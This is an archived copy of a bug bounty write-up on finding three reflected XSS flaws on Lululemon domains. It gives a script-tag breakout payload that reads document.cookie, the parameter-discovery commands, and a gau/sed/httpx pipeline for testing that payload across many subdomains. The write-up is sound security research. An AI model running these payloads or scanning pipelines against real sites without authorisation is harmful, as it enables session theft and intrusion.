---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-07_how-i-found-3-rxss-on-the-lululemon-bug-bounty-program.md
original_filename: 2022-09-07_how-i-found-3-rxss-on-the-lululemon-bug-bounty-program.md
title: How I found 3 RXSS on the Lululemon bug bounty program
category: documents
detected_topics:
- xss
- command-injection
- rate-limit
tags:
- imported
- documents
- xss
- command-injection
- rate-limit
language: en
raw_sha256: 058dbb38fd3ec21807b27760ab77bcb0a81210c08f14d282cec5bade97cd0e2d
text_sha256: 608c6d8aaa3b79ceae2ec4b621a3f90af7cd54a8e48505837cadd8be0075a835
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# How I found 3 RXSS on the Lululemon bug bounty program

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-07_how-i-found-3-rxss-on-the-lululemon-bug-bounty-program.md
- Source Type: markdown
- Detected Topics: xss, command-injection, rate-limit
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `058dbb38fd3ec21807b27760ab77bcb0a81210c08f14d282cec5bade97cd0e2d`
- Text SHA256: `608c6d8aaa3b79ceae2ec4b621a3f90af7cd54a8e48505837cadd8be0075a835`


## Content

---
title: "How I found 3 RXSS on the Lululemon bug bounty program"
page_title: "How I found 3 RXSS on Lululemon bug bounty program | by Omar Hashem | InfoSec Write-ups"
url: "https://omar0x01.medium.com/how-i-found-3-rxss-on-the-lululemon-bug-bounty-program-fa357a0154c2"
authors: ["Omar Hashem (@OmarHashem666)"]
programs: ["lululemon"]
bugs: ["XSS"]
publication_date: "2022-09-07"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2199
scraped_via: "browseros"
---

# How I found 3 RXSS on the Lululemon bug bounty program

How I found 3 RXSS on Lululemon bug bounty program
Omar Hashem
Follow
3 min read
·
Sep 7, 2022

453

7

Hi everybody, today i will show you how can simple technique lead you to find multiple series vulnerabilities across the whole subdomains

Press enter or click to view image in full size
Let’s start our story

While i was hunting on Lululemon program on Bugcrowd

I started to take a look on the main domain https://www.lululemon.co.uk

After i have spend some time on the main domain i started to do parameter brute force using Arjun

┌──(omar㉿kali)-[~]
└─$ arjun -u https://www.lululemon.co.uk/en-uk/search -oT lululemon-parameters

The output file was look like that

Press enter or click to view image in full size

┌──(omar㉿kali)-[~]
└─$ cat lululemon-parameters|qsreplace omar

Press enter or click to view image in full size

requesting the link in browser found that q parameter value is reflected between double quotes inside script tag

<script>some javascript code;var q="omar"; some javascript code;</script>

i tried to get out of the double quote and injecting my payload inside script tag like this

https://www.lululemon.co.uk/en-uk/search?q=omar“;alert(domain);//

but the reflection was like that

<script>some javascript code;var q="omar\";alert(domain);//"; some javascript code;</script>

So it looks like that the developer bypass the quotes to prevent attackers to get out from the double quotes to not inject malicious code

What about open tag <

https://www.lululemon.co.uk/en-uk/search?q=omar<

the reflection was like that

<script>some javascript code;var q="omar<"; some javascript code;</script>

So I expected the developers used code in the backend to print the value of the q parameter like this

Get Omar Hashem’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

<?php echo(addslashes($_GET['q'])) ?>

This means we can’t use quotes but we can close the script tag then open a new tag and write our javascript code in it

https://www.lululemon.co.uk/en-uk/search?q=</script><script>alert(document.cookie)</script>

The first XSS on:

https://www.lululemon.co.uk

Press enter or click to view image in full size

Usually when developers make a mistake there is a high possibility to make it on other places

So the next step is to test this XSS on the other domains and subdomains endpoints

Simple Recon:

Passively collect endpoints with gau tool then using uro tool to get unique endpoints, filter image, js, css and other static files

┌──(omar㉿kali)-[~]
└─$ cat subdomains.txt|gau |uro >endpoints.txt

Using sed command to add our “q” parameter to the all endpoints with url encoded payload “</script><script>alert(document.cookie)</script>” as a value

┌──(omar㉿kali)-[~]
└─$ sed -E -i “s/\?(.*)|$/\?q=%3C%2Fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E/g” endpoints.txt

Using httpx to request the endpoints and matching on our payload using argument -ms

┌──(omar㉿kali)-[~]
└─$ httpx -l endpoints.txt -ms “</script><script>alert(document.cookie)</script>”

And that was the results

The second XSS on:

https://www.lululemon.com.hk

Press enter or click to view image in full size
The third XSS on:

https://www.eu.lululemon.com

Press enter or click to view image in full size
Stay in touch:

LinkedIn | Youtube | Twitter

From Infosec Writeups: A lot is coming up in the Infosec every day that it’s hard to keep up with. Join our weekly newsletter to get all the latest Infosec trends in the form of 5 articles, 4 Threads, 3 videos, 2 Github Repos and tools, and 1 job alert for FREE!
